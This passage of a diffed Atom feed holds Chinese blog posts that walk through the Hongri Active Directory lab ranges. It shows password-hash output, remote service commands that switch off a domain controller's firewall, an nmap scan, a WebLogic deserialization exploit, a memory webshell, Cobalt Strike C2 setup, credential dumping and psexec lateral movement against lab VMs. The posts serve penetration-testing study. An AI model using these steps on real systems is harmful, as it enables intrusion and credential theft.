+</span></span><span style="display:flex;"><span>win2008$       TEST.ORG  <span style="color:#ae81ff">94</span> 1f <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">44</span> 5a 0c 6d 4d dd a9 9d <span style="color:#ae81ff">09</span> 7a d0 <span style="color:#ae81ff">72</span> bb e9 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">69</span> 7e <span style="color:#ae81ff">96</span> 9f <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> f2 9e d3 f2 <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">74</span> 7a 2f <span style="color:#ae81ff">49</span> 4e b7 <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">01</span> e5 <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">75</span> 8f <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">44</span> d4 <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">17</span>  
+</span></span><span style="display:flex;"><span>                          <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">25</span> 2a d4 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">87</span> ec <span style="color:#ae81ff">34</span> e8 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">74</span> 8f b6 0a ef <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">17</span> af 2e 5b <span style="color:#ae81ff">08</span> f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">96</span> f6 <span style="color:#ae81ff">75</span> b5 <span style="color:#ae81ff">0</span>  
+</span></span><span style="display:flex;"><span>                         d c1 e1 <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">07</span> d2 a8 <span style="color:#ae81ff">99</span> e5 5f 7d e9 0c <span style="color:#ae81ff">76</span> a3 7e <span style="color:#ae81ff">51</span> e5 f1 d0 f0 da c5 0c <span style="color:#ae81ff">88</span> d0 1c <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">34</span> b9 3e <span style="color:#ae81ff">14</span> ab a1 7b <span style="color:#ae81ff">56</span> cd 9d <span style="color:#ae81ff">67</span> d3 <span style="color:#ae81ff">19</span> c7 ad d9 b2 8d <span style="color:#ae81ff">72</span>   
+</span></span><span style="display:flex;"><span>                         e9 2a c2 d0 be ff e7 e7 d2 <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">85</span> 9a <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">74</span> 8c d5 0a b5 1c <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">28</span> de <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">58</span> 8a da 3a db <span style="color:#ae81ff">61</span> 5d be f9 d5 b8 a8 5c fe <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">06</span> f6 ac ac <span style="color:#ae81ff">26</span> 6d  
+</span></span><span style="display:flex;"><span>                          <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">80</span> e3 f4 f6 <span style="color:#ae81ff">49</span> f8 <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">78</span> 9b a7 <span style="color:#ae81ff">36</span> 6d f7 c4 <span style="color:#ae81ff">10</span> a3 8e <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">83</span> c5 <span style="color:#ae81ff">84</span> ff 3f fc 9c <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">81</span> 2d <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> 8a <span style="color:#ae81ff">30</span> 5a 7e ca ee 3f <span style="color:#ae81ff">50</span> 0b c8 c6 <span style="color:#ae81ff">68</span> a8 <span style="color:#ae81ff">24</span> cc c  
+</span></span><span style="display:flex;"><span>                         <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">52</span> 5e b8 <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">30</span> b7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><p>接下来就是尝试登录域控</p>
+<h3 id="关闭域控防火墙并拿到session">关闭域控防火墙并拿到session</h3>
+<p>这里先使用win7的session来关闭win2012域控机器的防火墙</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net use <span style="color:#ae81ff">\\</span>192.168.93.10<span style="color:#ae81ff">\i</span>pc$ <span style="color:#e6db74">&#34;zxcASDqw123!!&#34;</span> /user:<span style="color:#e6db74">&#34;Administrator&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 create unablefirewall binpath<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;netsh advfirewall set allprofiles state off&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 start unablefirewall
+</span></span></code></pre></div><p>然后在使用msf的psexec模块拿shell
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt=""  /></p>
+<p>发现还有不少东西要学,win和linux的免杀,win域渗透,权限维持&hellip;.我还要继续学下去吗,已经沉没的比较多了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt=""  /></p>
+<p>最后偷一张拓扑图
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt=""  /></p>
+<h1 id="引用">引用</h1>
+<p><a href="https://blog.csdn.net/qq_47289634/article/details/132021341" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/qq_47289634/article/details/132021341</a></p>
+<p><a href="https://blog.csdn.net/2301_76227305/article/details/139067562" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/2301_76227305/article/details/139067562</a></p>
+<p><a href="https://www.bilibili.com/read/cv33395770/" target="_blank" rel="noopener nofollow noreferrer" >https://www.bilibili.com/read/cv33395770/</a></p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        
+        <entry>
+            <title type="html"><![CDATA[红日靶场2_win域]]></title>
+            <link href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" rel="alternate" type="text/html" />
+            
+                <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</id>
+            
+            
+            <published>2024-09-28T11:10:12+08:00</published>
+            <updated>2024-11-24T18:41:52+08:00</updated>
+            
+            
+            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>环境和红日1的环境搭建差不多，不过这次给三台机器分别是域控、web服务器、个人PC机，与红日1不同的是这里将域管换成了个人PC机，因此我们的一些操作也会有所不同</p>
+<h1 id="红日靶场2_win域">红日靶场2_win域</h1>
+<h2 id="搭建环境">搭建环境</h2>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt=""  /></p>
+<pre tabindex="0"><code>administrator
+1qaz@WSX
+默认密码都是1qaz@WSX
+</code></pre><p>这里需要模拟内网环境,所以需要弄一个内网网卡</p>
+<p>创建一个vmnet2
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt=""  /></p>
+<p>然后把三台机器的网卡2都改成这个vmnet2就行了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt=""  />
+DC机器不需要做什么处理,改完网卡直接启动就行</p>
+<p>这里的另外一个网卡,作者设置的是111网段,但是我习惯了自己的ip,所以选择改pc和web两台机器里面的ip</p>
+<p>先改一下pc这台机器,这台先改下ip
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt=""  />
+再测试一下连通性,使用外部的parrot机器ping一下,没通,需要关闭防火墙
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt=""  /></p>
+<p>最后配置web机器,web机器需要先将恢复快照1.3版本
+会出现一个报错,直接点放弃就行,<strong>这里恢复快照之后,需要重新改网卡,怪不得ping不通域控的</strong></p>
+<p>登录本地用户</p>
+<pre tabindex="0"><code>.\de1ay
+1qaz@WSX
+</code></pre><p>这里提示需要修改密码,我改成1qaz@WSX3
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt=""  />
+进去之后直接注销掉,切换成域用户mssql,密码还是1qaz@WSX</p>
+<p>然后还是先改ip
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt=""  /></p>
+<p>改完之后测试一下两个网段都能不能ping通</p>
+<p>ping不通的话得关一下web的防火墙,关掉之后就能ping通了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt=""  /></p>
+<p>红日1是以phpstudy搭的一个web服务，红日2用的是weblogic。web服务中，我们需要手动打开weblogic</p>
+<p>进入这个路径<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>,没权限的时候,输管理员凭据就行.
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt=""  />
+以管理员身份启动一下weblogic
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt=""  /></p>
+<p>搭建时参考的文章提到:
+WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动（Computer Browser 是关闭的,导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）</p>
+<p>我这里web里的Computer Browser是关闭的,我手动打开了,pc机器是正常的.</p>
+<p>访问192.168.3.80:7001/console,跳转进去登录页面,环境搭建成功
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt=""  /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
+</span></span><span style="display:flex;"><span>pc  192.168.3.201
+</span></span><span style="display:flex;"><span>win 192.168.3.99
+</span></span><span style="display:flex;"><span>wsl kali 192.168.3.100 
+</span></span></code></pre></div><h2 id="外网">外网</h2>
+<h3 id="信息收集">信息收集</h3>
+<p>先处理web机器</p>
+<p>端口扫描出来了不少端口,使用awk做一下处理,提取一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  <span style="color:#e6db74">&#39;BEGIN {ORS=&#34;,&#34;} {print $1}&#39;</span> a.txt
+</span></span></code></pre></div><p>进行-A扫描</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>⇒  sudo nmap -Pn -sT 192.168.3.80  -p80,135,139,445,1433,3389,7001,49152,49153,49154,60966,63624,63632,63634 -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-28 19:40 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.3.80
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00057s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE            VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http               Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds       Windows Server <span style="color:#ae81ff">2008</span> R2 Standard <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s           Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 10.50.4000.00; SP2
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-28T03:49:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2054-09-28T03:49:00
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   192.168.3.80:1433:
+</span></span><span style="display:flex;"><span>|     Target_Name: DE1AY
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: DE1AY
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WEB
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: WEB.de1ay.com
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|_    Product_Version: 6.1.7601
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   192.168.3.80:1433:
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 SP2
+</span></span><span style="display:flex;"><span>|       number: 10.50.4000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2
+</span></span><span style="display:flex;"><span>|       Service pack level: SP2
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>3389/tcp  open  ssl/ms-wbt-server?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>WEB.de1ay.com
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-27T03:21:26
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-03-29T03:21:26
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>|   Target_Name: DE1AY
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: DE1AY
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: WEB
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: WEB.de1ay.com
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|   Product_Version: 6.1.7601
+</span></span><span style="display:flex;"><span>|_  System_Time: 2024-09-28T23:42:27+00:00
+</span></span><span style="display:flex;"><span>7001/tcp  open  http               Oracle WebLogic Server 10.3.6.0 <span style="color:#f92672">(</span>Servlet 2.5; JSP 2.1; T3 enabled<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_weblogic-t3-info: T3 protocol in use <span style="color:#f92672">(</span>WebLogic version: 10.3.6.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Error 404--Not Found
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>60966/tcp open  ms-sql-s           Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 10.50.4000.00; SP2
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
+</span></span><span style="display:flex;"><span>|   192.168.3.80:60966:
+</span></span><span style="display:flex;"><span>|     Target_Name: DE1AY
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: DE1AY
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WEB
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: WEB.de1ay.com
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: de1ay.com
+</span></span><span style="display:flex;"><span>|_    Product_Version: 6.1.7601
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   192.168.3.80:60966:
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 SP2
+</span></span><span style="display:flex;"><span>|       number: 10.50.4000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2
+</span></span><span style="display:flex;"><span>|       Service pack level: SP2
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">60966</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-28T03:49:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2054-09-28T03:49:00
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>63624/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>63632/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>63634/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:42:36:4C <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Microsoft Windows Vista|7|8.1
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
+</span></span><span style="display:flex;"><span>OS details: Microsoft Windows Vista, Windows <span style="color:#ae81ff">7</span> SP1, or Windows 8.1 Update <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-09-28T23:42:27
+</span></span><span style="display:flex;"><span>|_  start_date: 2024-09-28T03:48:57
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WEB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:42:36:4c <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -53m19s, deviation: 2h39m59s, median: 0s
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2008</span> R2 Standard <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 Standard 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+</span></span><span style="display:flex;"><span>|   Computer name: WEB
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: WEB<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: de1ay.com
+</span></span><span style="display:flex;"><span>|   Forest name: de1ay.com
+</span></span><span style="display:flex;"><span>|   FQDN: WEB.de1ay.com
+</span></span><span style="display:flex;"><span>|_  System time: 2024-09-29T07:42:27+08:00
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2:1:0:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   0.57 ms 192.168.3.80
+</span></span></code></pre></div><p>这里的web端口是7001的weblogic</p>
+<h3 id="weblogic_1036_利用">weblogic_10.3.6_利用</h3>
+<p>最后一个复现的漏洞的影响版本里面就有这个10.3.6,先测测这个(好吧,vulhub上weblogic的那几个漏洞基本上都有10.3.6.0)
+<a href="weblogic-wls-wsat-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e.md">weblogic-wls-wsat-反序列化漏洞</a>
+这个检测脚本卡主了,上一键利用工具了</p>
+<p>CVE-2016-0638
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt=""  /></p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt=""  /></p>
+<h3 id="antsword_内存马">antsword_内存马</h3>
+<p>使用这个工具里面的内存马,上传antsword_Custom_Filter内存马</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650"  /></p>
+<p>进去之后查看ip,是存在内网环境的
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt=""  /></p>
+<h2 id="内网">内网</h2>
+<p>这里还有一台PC机器是暴露在外网环境中的,但是已经拿了web机器的shell,就先进内网</p>
+<h3 id="信息收集-1">信息收集</h3>
+<p>局域网机器
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt=""  />
+本机信息
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt=""  />
+无法查看域用户
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt=""  />
+本地管理员组,这里面有域用户DE1AY\Domain Admins这个域用户
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt=""  />
+域信息
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt=""  /></p>
+<h3 id="cs上线">CS上线</h3>
+<p>添加监听器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
+</span></span><span style="display:flex;"><span>payload：payload类型
+</span></span><span style="display:flex;"><span>HTTP Hosts: shell反弹的主机，也就是我们kali的ip（如果是阿里云，则填阿里云主机的公网ip）
+</span></span><span style="display:flex;"><span>HTTP Hosts(Stager): Stager的马请求下载payload的地址（一般也是和上面的ip填一样）
+</span></span><span style="display:flex;"><span>HTTP Port(C2): C2监听的端口
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt=""  />
+创建payload
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt=""  />
+上传马子,将shell传到cs上
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt=""  /></p>
+<p>获取明文凭据
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt=""  /></p>
+<p>rdp也能连上去
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt=""  />
+噢,简称和完整域名的区别
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt=""  /></p>
+<h3 id="cs后渗透_横向移动">CS后渗透_横向移动</h3>
+<p>上线cs之后,使用cs上面的横向移动模块中psexec就能解决掉剩下的两台机器了</p>
+<p>域控
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt=""  /></p>
+<p>PC机器
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt=""  /></p>
+<h1 id="links">links</h1>
+<p><a href="https://xz.aliyun.com/t/11676" target="_blank" rel="noopener nofollow noreferrer" >https://xz.aliyun.com/t/11676</a></p>
+<p><a href="https://www.viewofthai.link/2022/09/11/" target="_blank" rel="noopener nofollow noreferrer" >https://www.viewofthai.link/2022/09/11/</a>红日att＆ck系列靶场（二）/</p>
+<p><a href="https://github.com/Aedoo/CVE-2018-2628-MultiThreading" target="_blank" rel="noopener nofollow noreferrer" >CVE-2018-2628检测脚本</a></p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+</feed>
